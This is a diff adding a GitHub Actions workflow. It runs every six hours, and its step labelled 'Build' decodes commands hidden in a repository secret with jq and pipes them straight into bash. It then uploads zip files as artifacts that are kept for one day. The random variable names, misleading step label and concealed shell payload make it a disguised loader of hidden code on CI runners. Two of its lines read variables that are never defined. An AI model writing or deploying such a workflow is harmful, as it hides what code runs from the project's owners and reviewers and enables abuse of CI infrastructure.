@@ -1,0 +1,29 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          ul3127: ${{ secrets.ul3127 }}
+        run: |
+          printf '%s' "$ul3127" | jq -r .thcnq247 | /bin/bash
+          echo $jav9052 | jq -r .lu34527 | /bin/bash
+          printf '%s' "$zm66" | jq -r .we85 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: GigWom8p
+          path: "*.zip"
+          retention-days: 1
